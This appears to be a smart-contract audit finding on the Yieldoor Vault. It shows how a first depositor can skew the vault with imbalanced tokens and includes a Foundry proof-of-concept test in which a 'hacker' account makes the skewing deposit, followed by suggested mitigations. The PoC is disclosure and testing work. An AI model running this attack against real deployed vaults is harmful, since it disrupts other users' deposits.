# A malicious first depositor can make a vault highly imbalanced

### Summary

Vaults enable depositors to make profits without creating leveraged positions.

However, there exists a risk that the initial depositor could disrupt the vault's balance by contributing an imbalanced pair of assets.

### Root Cause

The [`Vault::deposit()`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L48-L72) function first calculates the amounts of both tokens to deposit, and then receives the tokens.

```solidity
    function deposit(uint256 amount0, uint256 amount1, uint256 amount0Min, uint256 amount1Min)
        external
        returns (uint256 shares, uint256 depositAmount0, uint256 depositAmount1)
    {
        IStrategy(strategy).collectFees();

        (uint256 totalBalance0, uint256 totalBalance1) = IStrategy(strategy).balances();

        (shares, depositAmount0, depositAmount1) = _calcDeposit(totalBalance0, totalBalance1, amount0, amount1);

        IERC20(token0).safeTransferFrom(msg.sender, strategy, depositAmount0);
        IERC20(token1).safeTransferFrom(msg.sender, strategy, depositAmount1); // after deposit, funds remain idle, until compound is called

        ... ...

        return (shares, depositAmount0, depositAmount1);
        // TODO - emit event
    }
```

The `_calcDeposit()` function is responsible for calculating the deposit amounts.

```solidity
    function _calcDeposit(uint256 bal0, uint256 bal1, uint256 depositAmount0, uint256 depositAmount1)
        internal
        view
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        uint256 totalSupply = totalSupply();

        // If total supply > 0, vault can't be empty
        assert(totalSupply == 0 || bal0 > 0 || bal1 > 0);

        if (totalSupply == 0) {
            // For first deposit, just use the amounts desired
            amount0 = depositAmount0;
            amount1 = depositAmount1;
            shares = (amount0 > amount1 ? amount0 : amount1) - (1000);
        } else if (bal0 == 0) {
            amount1 = depositAmount1;
            shares = amount1 * totalSupply / bal1;
        } else if (bal1 == 0) {
            amount0 = depositAmount0;
            shares = amount0 * totalSupply / bal0;
        } else {
            uint256 cross0 = depositAmount0 * bal1;
            uint256 cross1 = depositAmount1 * bal0;
            uint256 cross = cross0 > cross1 ? cross1 : cross0;
            require(cross > 0, "cross");

            // Round up amounts
            amount0 = (cross - 1) / bal1 + 1;
            amount1 = (cross - 1) / bal0 + 1;
            shares = cross * totalSupply / bal0 / bal1;
        }
    }
```

If we take a look at the above function, we can realize that when `totalSupply` is 0, the `deposit()` function accepts all incoming amounts. After then, the vault tries to retain the balanced state of the tokens.

A malicious depositor can deposit imbalanced amounts of tokens as first deposit of the vault, and make the vault remain imbalanced.

### Internal pre-conditions

*None*

### External pre-conditions

*None*

### Attack Path

1. A malicious depositor back-runs the vault creation to deposit highly imbalanced tokens.
2. After then, any legit depositors cannot provide balanced tokens, thus making the vault imbalanced.

### Impact

Even though a vault can have a pair of tokens, it will retain only one token as reserves.

### PoC

The following test case shows how the imbalanced vault rejects one of a legit user's deposit tokens.

```solidity
    function test_H05_ImbalancedVault() external {
        vm.startPrank(owner);
        address newVault = address(new Vault(address(usdc), address(weth)));
        address newStrategy = address(new Strategy(address(pool), address(vault), rebalancer, feeRecipient));
        IVault(newVault).setStrategy(newStrategy);
        vm.stopPrank();

        // A hacker makes the vault imbalanced
        address hacker = address(0xaaa);
        // make initial deposit
        deal(address(weth), hacker, 1e18);
        deal(address(usdc), hacker, 1);

        vm.startPrank(hacker);
        weth.approve(newVault, type(uint256).max);
        usdc.approve(newVault, type(uint256).max);

        IVault(newVault).deposit(1, 1e18, 0, 0);
        assertEq(weth.balanceOf(hacker), 0);
        assertEq(usdc.balanceOf(hacker), 0);
        vm.stopPrank();

        // A legit user attempts to make a legal deposit
        deal(address(weth), user, 1e18); // 1 ETH
        deal(address(usdc), user, 2500e6); // 2500 USDC
        
        console.log("User's weth balance before deposit:", weth.balanceOf(user));
        console.log("User's usdc balance before deposit:", usdc.balanceOf(user));

        vm.startPrank(user);
        weth.approve(newVault, type(uint256).max);
        usdc.approve(newVault, type(uint256).max);

        IVault(newVault).deposit(2500e6, 1e18, 0, 0);
        console.log("User's weth balance after deposit:", weth.balanceOf(user));
        console.log("User's usdc balance after deposit:", usdc.balanceOf(user));
        vm.stopPrank();
    }
```

Output Logs:
```bash

  User's usdc balance before deposit: 2500000000

  User's usdc balance after deposit: 2500000000
```

As can be seen from the logs, the legit user's usdc deposit becomes rejected due to highly imbalanced status of the vault.

### Mitigation

There are 2 alternative mitigation options in my opinion:
1. The vault owner should make a first deposit with relatively balanced tokens
2. If it's first deposit, just check the balanced status of incoming tokens

I think, there may be more mitigation ways.
